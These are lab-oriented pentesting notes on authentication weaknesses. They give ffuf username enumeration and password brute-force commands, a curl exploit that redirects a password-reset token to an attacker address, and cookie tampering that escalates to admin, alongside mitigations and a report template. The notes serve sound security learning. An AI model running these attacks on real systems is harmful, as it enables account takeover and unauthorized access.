## Overview

These notes explain common authentication weaknesses, how to identify them in a target application, and how to demonstrate proof-of-concept (PoC) exploits safely. Always ensure you have explicit authorization and remain within scope when testing.

---

## Prerequisites

- Authorization to test the target.
    
- `ffuf` installed for fuzzing and brute forcing.
    
- `curl` available for HTTP requests.
    
- Wordlists such as SecLists for usernames and passwords.
    

---

## Username enumeration (ffuf)

**Purpose:** Identify which usernames exist so subsequent attacks (password guessing, social engineering) are focused.

**ffuf example (signup form):**

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
  -X POST \
  -d "username=FUZZ&email=x&password=x&cpassword=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://MACHINE_IP/customers/signup \
  -mr "username already exists"
```

**Explanation:**

- `-w` specifies the username wordlist.
    
- `FUZZ` is replaced with each username from the list.
    
- `-X POST` and `-d` send form data to the signup endpoint.
    
- `-mr` matches responses containing the success/error string indicating the username exists.
    

**Tips:**

- Clean ffuf output to extract only usernames (one per line) before using them in later tests.
    
- If rate-limited, reduce thread count or add delays.
    
- Observe other indicators (status code, response length, headers).
    

---

## Brute forcing logins using ffuf (usernames × passwords)

**Purpose:** Attempt password lists against valid usernames discovered earlier.

**ffuf example:**

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
  -X POST \
  -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://MACHINE_IP/customers/login \
  -fc 200
```

**Explanation:**

- `W1` and `W2` are placeholders for the first and second wordlists.
    
- `-fc 200` filters responses by HTTP status code (adjust based on target behavior).
    

**Notes and cautions:**

- Ensure `valid_usernames.txt` contains plain usernames only (no ffuf metadata).
    
- Tailor filters to the application (length, status, redirects, regex match).
    
- Respect rate limits and legal boundaries.
    

---

## Logic flaws in authentication

**Definition:** A logic flaw occurs when the intended control flow of an application can be bypassed or manipulated, allowing unauthorized actions without exploiting implementation bugs.

**Simple code example (pseudo-JS):**

```js
if (url.substr(0,6) === '/admin') {
  // check admin
} else {
  // show page without check
}
```

If the application performs an exact-case check, requesting `/adMin` may bypass the admin check and display the page without authorization.

**Impact:** Authorization bypass, data exposure, administrative actions without credentials.

---

## Password reset logic-flaw PoC (merge of GET and POST)

**Issue:** The application reads inputs from both query string (GET) and POST and uses `$_REQUEST` (or equivalent) that merges these sources. If POST values override GET values, an attacker can control where reset tokens are sent.

**Normal request (username in POST, email in GET):**

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=robert'
```

**Vulnerable exploit (POST `email` overrides GET `email`):**

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=robert&email=attacker@hacker.com'
```

**Lab escalation trick:**

1. Create an account at `{youruser}@customer.acmeitsupport.thm` (attacker-controlled mail or ticket viewable by you).
    
2. Use that address in the POST `email` value so the application may generate a ticket or reset link accessible to the attacker but referencing the victim account.
    

**Mitigations:**

- Do not rely on merged request sources for authoritative values.
    
- Retrieve the account server-side and use the verified email stored on the account.
    
- Generate single-use tokens tied to the account and never send tokens to user-supplied destination addresses.
    

---

## Cookie tampering

**Issue:** Storing authorization state or roles in client-side cookies (plain text or easily reversible formats) without server-side validation allows privilege escalation via cookie modification.

**Plain-text cookie example:**

```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

**Tampering with curl:**

```bash
# Not logged in
curl http://10.201.105.213/cookie-test

# Simulate user cookie
curl -H "Cookie: logged_in=true; admin=false" http://10.201.105.213/cookie-test

# Tamper to admin
curl -H "Cookie: logged_in=true; admin=true" http://10.201.105.213/cookie-test
```

**Base64 JSON cookie example:**

```
session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
# base64 decode -> {"id":1,"admin": false}
```

If the server accepts the cookie value without validation, an attacker can decode, change `admin` to `true`, re-encode, and gain admin access.

**Mitigations:**

- Do not store role or auth state client-side in plaintext.
    
- Use server-side session stores keyed by a random session id in the cookie.
    
- If storing data client-side, use signed (HMAC) or encrypted cookies and validate signatures on every request.
    
- Set `HttpOnly`, `Secure`, and `SameSite` attributes.
    

---

## Hashing vs Encoding

**Hashing:**

- One-way function, deterministic, used for password storage and integrity checks.
    
- Examples: MD5, SHA-1, SHA-256, SHA-512.
    
- Not reversible; attackers may use brute force or rainbow tables against unsalted hashes.
    

**Encoding:**

- Reversible transformation for safe transport/storage, not a security control.
    
- Examples: base64, base32, URL encoding.
    

**Base64 example (decode/encode):**

```bash
# Decode
echo 'eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==' | base64 --decode
# -> {"id":1,"admin": false}

# Create modified JSON and base64 encode
echo -n '{"id":1,"admin": true}' | base64
# -> eyJpZCI6MSwiYWRtaW4iOnRydWV9
```

---

## Mitigations and defensive controls

- Centralize critical authorization and authentication logic on the server.
    
- Normalize error messages to avoid revealing user existence. Use generic reset messages (e.g., "If an account exists, an email will be sent.")
    
- Implement rate limiting, account lockout thresholds, and monitoring for brute-force attempts.
    
- Use signed or encrypted cookies or server-side sessions; validate cookie signature on every request.
    
- Use secure cookie attributes: `HttpOnly`, `Secure`, `SameSite`.
    
- Use strong, salted password hashing (bcrypt/argon2) and enforce MFA (2FA) for sensitive accounts.
    
- Ensure password reset tokens are single-use, time-limited, tied to account, and sent only to verified email addresses on file.
    

---

## Pentester checklist

1. Confirm authorization and scope.
    
2. Enumerate usernames where in-scope and allowed.
    
3. Sanitize username lists before brute forcing.
    
4. Tailor brute force filters to target behavior (status codes, length, redirects).
    
5. Examine flows that mix GET and POST or use merged request variables.
    
6. Inspect cookies for plain-text or base64-encoded JSON; attempt decoding and controlled tampering only when in scope.
    
7. Document reproducible PoC steps and recommended remediation.
    

---

## Useful commands and tips

### Clean ffuf output to usernames only

If ffuf output contains extra columns, extract usernames with `awk`/`cut` or by validating the known format. Example when ffuf is run with `-o` CSV or custom output, adjust extraction accordingly.

### Slow ffuf to avoid lockouts

- Reduce threads: `-t 10` (default is higher)
    
- Add delay between requests: use rate limit or external wrapper (e.g., `pv -qL`) or use `-p` for proxy timing if available
    

### Tailor ffuf matching

- Use `-mc` to match status code or `-ml` for body length or `-mr` with regex to match response bodies.
    

---

## Reporting template (PoC)

**Title:** Password reset logic-flaw allows attacker-controlled delivery of reset token

**Summary:** The password reset endpoint accepts an email in the query string and accepts a POST `email` parameter. The server uses merged request data (`$_REQUEST`) and prefers POST values. An attacker can submit a POST `email` value pointing to an attacker-controlled account to receive a reset token or ticket referencing a victim account.

**Impact:** Full account takeover via reset token disclosure if the attacker can access the attacker-controlled destination.

**Steps to reproduce:**

1. Send GET+POST as shown below:
    

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=robert&email=attacker@customer.acmeitsupport.thm'
```

2. Observe that the reset token or support ticket is delivered to `attacker@customer.acmeitsupport.thm` and is accessible to attacker.
    

**Remediation:**

- Use server-stored email address for token delivery.
    
- Avoid merging GET/POST for authoritative parameters.
    
- Tie tokens to the account and validate token recipients server-side.
    

---

## Legal and ethical note

Only perform these tests on systems you are explicitly authorized to test. Unauthorized testing, brute forcing, or account takeover attempts may be illegal and unethical.

---
